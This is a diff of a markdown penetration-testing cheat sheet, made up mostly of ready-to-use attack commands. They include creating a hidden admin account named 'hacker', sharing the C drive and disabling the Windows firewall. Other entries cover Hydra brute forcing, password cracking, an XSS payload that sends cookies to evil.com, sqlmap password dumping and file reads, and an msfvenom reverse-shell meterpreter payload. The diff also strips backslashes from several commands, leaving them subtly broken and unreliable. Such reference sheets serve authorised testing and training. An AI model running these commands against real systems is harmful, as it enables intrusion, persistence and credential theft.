@@ -1,5 +1,3 @@
-
-
 **RECON AND ENUMERATION**
 
 | **Command** | **Description** |
@@ -22,10 +20,8 @@
 | nslookup -&gt; set type=any -&gt; ls -d &lt;domain&gt; | DNS zone transfer \(Windows\) |
 | nmap --script=smb-check-vulns --script-args=unsafe=1 -p445 &lt;host&gt; | SMB vuln scan |
 
+**WINDOWS COMMANDS**
 
-
-**WINDOWS COMMANDS**  
-  
 [https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit](https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit)
 
 | ipconfig /all | Displays the full information about your NIC’s. |
@@ -34,7 +30,7 @@
 | netstat –nabo | Lists ports / connections with corresponding process \(-b\), don’t perform looking \(-n\), all connections \(-a\) and owning process ID \(-o\) |
 | netstat –r | Displays the routing table |
 |  |  |
-| netstat -anob \| findstr “services, process or port” | The “b” flag makes the command take longer but will output the process name using each of the connections. |
+| 'netstat -anob \| findstr “services, process or port”' | The “b” flag makes the command take longer but will output the process name using each of the connections. |
 | netsh diag show all | {**XP only**} Shows information on network services and adapters |
 | net view | Queries NBNS/SMB \(SAMBA\) and tries to find all hosts in your current workgroup or domain. |
 | net view /domain | List all domains available to the host |
@@ -49,7 +45,7 @@
 | net group “Enterprise Admins” /domain | Prints the members of the Enterprise Admins group |
 | net group “Domain Controllers” /domain | Prints the list of Domain Controllers for the current domain |
 | net share | Displays your currently shared SMB entries, and what path\(s\) they point to |
-| net session \| find / “\\” |  |
+| net session \| find / “\” |  |
 | arp –a | Lists all the systems currently in the machine’s ARP table. |
 | route print | Prints the machine’s routing table. This can be good for finding other networks and static routes that have been put in place |
 | Whoami | View the current user |
@@ -57,11 +53,9 @@
 | taskkill /F /IM "cmd.exe" | Kill a process by its name |
 | net user hacker hacker /add | Creates a new local \(to the victim\) user called ‘hacker’ with the password of ‘hacker’ |
 | net localgroup administrators hacker /add | Adds the new user ‘hacker’ to the local administrators group |
-| net share nothing$=C:\ /grant:hacker,FULL /unlimited | Shares the C drive \(you can specify any drive\) out as a Windows share and grants the user ‘hacker’ full rights to access, or modify anything on that drive.One thing to note is that in newer \(will have to look up exactly when, I believe since XP SP2\) windows versions, share permissions and file permissions are separated. Since we added our selves as a local admin this isn’t a problem but it is something to keep in mind |
+| net share nothing$=C: /grant:hacker,FULL /unlimited | Shares the C drive \(you can specify any drive\) out as a Windows share and grants the user ‘hacker’ full rights to access, or modify anything on that drive.One thing to note is that in newer \(will have to look up exactly when, I believe since XP SP2\) windows versions, share permissions and file permissions are separated. Since we added our selves as a local admin this isn’t a problem but it is something to keep in mind |
 | net user username /active:yes /domain | Changes an inactive / disabled account to active. This can useful for re-enabling old domain admins to use, but still puts up a red flag if those accounts are being watched. |
 | netsh firewall set opmode disable | Disables the local windows firewall |
-
-
 
 **LINUX COMMANDS**
 
@@ -79,7 +73,6 @@
 | mysql -h &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; | Connect to mysql |
 | oscanner -s &lt;ip&gt; -r &lt;repfile&gt; | Oracle scanner |
 
-  
 **PASSWORD GUESSING**
 
 | **Command** | **Description** |
@@ -87,8 +80,6 @@
 | hydra -L users -P passwords -M 21.txt ftp | Brute ftp |
 | hydra -L users -P passwords -M 22.txt ssh | Brute ssh |
 | hydra -L users -P passwords -M 445.txt smb | Brute smb |
-
-
 
 | **User List** |
 | :--- |
@@ -100,7 +91,6 @@
 | Crt |
 | User |
 
-  
 **  
  PASSWORD CRACKING**
 
@@ -108,17 +98,13 @@
 | :--- | :--- |
 | john --wordlist=/usr/share/wordlists/rockyou.txt hashes | JTR default |
 
-  
-  
 **WEB APP**
 
 | **Command** | **Description** |
 | :--- | :--- |
 | document.write\('&lt;img src="[http://evil.com/x.gif?cookie=](http://evil.com/x.gif?cookie=)' + document.cookie + '" /&gt;\) | XSS steal cookie |
 | sqlmap -u &lt;target&gt; -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/test.php" | Targeted scan |
-| sqlmap -u[http://example.com](http://example.com/)--forms --batch --crawl=10 --cookie=jsessionid=12345 --level=5 --risk=3 |  |
-
-
+| sqlmap -u[http://example.com](http://example.com/)--forms --batch --crawl=10 --cookie=jsessionid=12345 --level=5 --risk=3 |    |
 
 **METASPLOIT**
 
@@ -147,8 +133,5 @@
 | post/windows/manage/powershell/exec\_powershell | Upload and run a PS script through a session |
 | msfvenom -p windows/meterpreter/reverse\_tcp LHOST=172.1.3.19 LPORT=4444 -a x86 -f exe -e x86/shikata\_ga\_nai -b '\x00' -i 3 &gt; meter.exe | Generate standalone payload |
 
-
-
-  
 
 
